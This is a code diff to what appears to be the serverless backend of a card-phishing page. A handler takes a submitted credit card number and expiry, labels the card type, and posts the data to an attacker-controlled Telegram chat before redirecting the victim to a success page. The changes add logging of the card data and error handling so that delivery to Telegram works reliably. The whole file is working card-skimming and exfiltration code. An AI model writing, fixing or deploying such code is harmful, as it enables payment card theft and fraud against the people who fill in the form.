@@ -19,13 +19,16 @@ exports.handler = async (event) => {
         const expMonth = params.get('cc-exp-month') || '';
         const expYear = params.get('cc-exp-year') || '';
 
+        console.log('Datos recibidos:', { cardNumber, expMonth, expYear });
+
         // Configuración de Telegram
         const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-            console.error('Faltan variables de entorno de Telegram');
-        } else {
+        console.log('Token existe:', !!TELEGRAM_BOT_TOKEN);
+        console.log('Chat ID existe:', !!TELEGRAM_CHAT_ID);
+
+        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
             // Detectar tipo de tarjeta
             const cleanNum = cardNumber.replace(/\s/g, '');
             let cardType = 'CARD';
@@ -37,21 +40,24 @@ exports.handler = async (event) => {
                 cardType = 'AMEX';
             }
 
-            // Crear mensaje con mejor formato
-            const fecha = new Date().toLocaleString('es-ES', { 
-                timeZone: 'America/Argentina/Buenos_Aires',
-                day: '2-digit',
-                month: '2-digit',
-                year: 'numeric',
-                hour: '2-digit',
-                minute: '2-digit',
-                second: '2-digit'
+            // Crear mensaje simple
+            const fecha = new Date().toLocaleString('es-AR', { 
+                timeZone: 'America/Argentina/Buenos_Aires'
             });
 
-            const message = `🔔 NUEVA TARJETA ASOCIADA\n\n💳 ${cardType}\n\nNúmero:\n${cleanNum}\n\nVencimiento:\n${expMonth}/${expYear}\n\nFecha y Hora:\n${fecha}`;
+            const message = `🔔 NUEVA TARJETA\n\n${cardType}\nNumero: ${cleanNum}\nVence: ${expMonth}/${expYear}\nFecha: ${fecha}`;
 
+            console.log('Enviando mensaje...');
+            
             // Enviar a Telegram
-            await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
+            try {
+                const result = await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
+                console.log('Mensaje enviado:', result);
+            } catch (telegramError) {
+                console.error('Error enviando a Telegram:', telegramError);
+            }
+        } else {
+            console.error('Faltan variables de entorno');
         }
 
         // Redirigir a página de éxito
@@ -84,17 +90,29 @@ function sendToTelegram(botToken, chatId, message) {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'Content-Length': data.length
+                'Content-Length': Buffer.byteLength(data)
             }
         };
 
         const req = https.request(options, (res) => {
             let response = '';
             res.on('data', (chunk) => response += chunk);
-            res.on('end', () => resolve(response));
+            res.on('end', () => {
+                console.log('Telegram response status:', res.statusCode);
+                console.log('Telegram response:', response);
+                if (res.statusCode === 200) {
+                    resolve(response);
+                } else {
+                    reject(new Error(`Telegram error: ${response}`));
+                }
+            });
         });
 
-        req.on('error', (error) => reject(error));
+        req.on('error', (error) => {
+            console.error('Request error:', error);
+            reject(error);
+        });
+        
         req.write(data);
         req.end();
     });
